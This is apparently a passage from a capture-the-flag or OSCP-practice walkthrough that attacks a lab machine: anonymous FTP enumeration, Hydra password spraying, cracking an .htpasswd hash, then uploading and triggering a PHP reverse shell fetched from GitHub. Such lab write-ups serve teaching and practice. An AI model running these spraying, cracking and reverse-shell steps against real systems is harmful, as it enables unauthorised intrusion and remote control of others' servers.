```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `curl -u 'offsec:elite' -X GET http://${ip}:242/shell.php`;

dv.paragraph("```bash\n" + command + "\n```");
```

### 

FTP Directory and File Enumeration

According to the `nmap` scan, anonymous login is allowed.

[![](https://benheater.com/content/images/2022/08/image-232.png)](https://benheater.com/content/images/2022/08/image-232.png)

Server is `zFTPServer v6.0` . I am able to list files and looks like I have read access to several directories. Enumerated any contents of readable directories, but it looks like none of the sub-directories or files are accessible.

However, looking through the `accounts` folder **_did_** give me an idea:

[![](https://benheater.com/content/images/2022/08/image-233.png)](https://benheater.com/content/images/2022/08/image-233.png)

This looks like a potential list of `zftp` users, especially since I can already login as `anonymous` . So, I decide to create a username list with the other two usernames.

  
  

### FTP Credential Spraying

```bash
echo 'Offsec' >> usernames.txt
echo 'admin' >> usernames.txt
```

Bash

Create a username list

```bash
# -I : ignore hydra.restore file
# -V : very verbose output
# -f : stop when a logon is found
# -L : username list
# -u : rotate around usernames, not passwords
# -P : passwords list

hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt 192.168.179.46 ftp
```

Bash

Do some password spraying with Hydra

[![](https://benheater.com/content/images/2022/08/image-234.png)](https://benheater.com/content/images/2022/08/image-234.png)

Well, well, well...

Let's try logging in, shall we?

[![](https://benheater.com/content/images/2022/08/image-235.png)](https://benheater.com/content/images/2022/08/image-235.png)

Beautiful. Looks like we have **read-only** access to these three files. But, the `.htpasswd` file contains a hash for the `offsec` user. If we crack it, we will be able to access the web server and perhaps, the FTP server.

```bash
ftp> less .htpasswd
```

Bash

Press 'q' to quit 'less' mode

[![](https://benheater.com/content/images/2022/08/image-236.png)](https://benheater.com/content/images/2022/08/image-236.png)

Let's take that hash and try and crack it.

  
  

### Crack the Web User Hash

```bash
echo 'offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0' > offsec.txt
john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt offsec.txt
```

Bash

[![](https://benheater.com/content/images/2022/08/image-237.png)](https://benheater.com/content/images/2022/08/image-237.png)

offsec:elite

  
  

### Test File Upload

```bash
ftp> put scan.nmap
```

Bash

Just testing a random file

[![](https://benheater.com/content/images/2022/08/image-240.png)](https://benheater.com/content/images/2022/08/image-240.png)

This is good news! Looks like we can write to the **web root**! Looks like we should be able to put a PHP reverse shell and execute it with the credentials we have now.

  
  

## TCP/242

### Login with Cracked Credential

[![](https://benheater.com/content/images/2022/08/image-238.png)](https://benheater.com/content/images/2022/08/image-238.png)

[![](https://benheater.com/content/images/2022/08/image-239.png)](https://benheater.com/content/images/2022/08/image-239.png)

  
  

# Exploit

## Use Your Preferred PHP Reverse Shell

```bash
wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php -O 0xBEN_shell.php
nano 0xBEN_shell.php
```

Bash

Edit the variables to point it at your VPN IP address and chosen TCP port and save the changes.

```php
$sh = new Shell('127.0.0.1', 9000);
```

PHP

Now, upload `shell.php` to the web root.

```bash
ftp> put 0xBEN_shell.php
```

Bash

  
  

## Shell Time

Start a listener and open `shell.php` .

```bash
sudo rlwrap -lnvp 53
curl -u 'offsec:elite' -X GET http://192.168.179.46:242/0xBEN_shell.php
```

Bash

[![](https://benheater.com/content/images/2022/08/image-241.png)](https://benheater.com/content/images/2022/08/image-241.png)